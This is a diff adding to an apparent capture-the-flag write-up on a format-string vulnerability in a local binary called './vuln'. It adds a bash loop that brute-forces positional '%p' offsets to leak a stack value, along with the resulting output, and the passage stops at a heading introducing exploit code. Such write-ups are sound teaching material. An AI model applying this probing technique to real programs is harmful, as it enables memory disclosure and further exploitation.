@@ -278,6 +278,23 @@ utflag{f0rm4t_str1ng_l34k3d}
 Base on the analyst, this binary has format-string vuln at `print(name)`. So here is the exploitation path:
 - `printf(name)` allows stack reads.
 - Brute-forced positional `%n$p` and found `offset=17` leaks a word containing `deadbeef` in lower 32 bits.
+    ```bash
+    for i in $(seq 1 80); do
+    out=$( (printf "%%%d\$p\n0\n" "$i"; ) | ./vuln 2>/dev/null )
+    if echo "$out" | grep -qi deadbeef; then
+        echo "offset=$i"
+        echo "$out"
+        break
+    fi
+    done
+    ```
+
+    Output:
+    ```text
+    offset=17
+    What is your name? Hello, 0xdeadbeef64181cd0!
+    Enter the secret code: Wrong! Nice try.
+    ```
 - This enables scriptable extraction of secret instead of hardcoding.
 
 This is the exploit code:
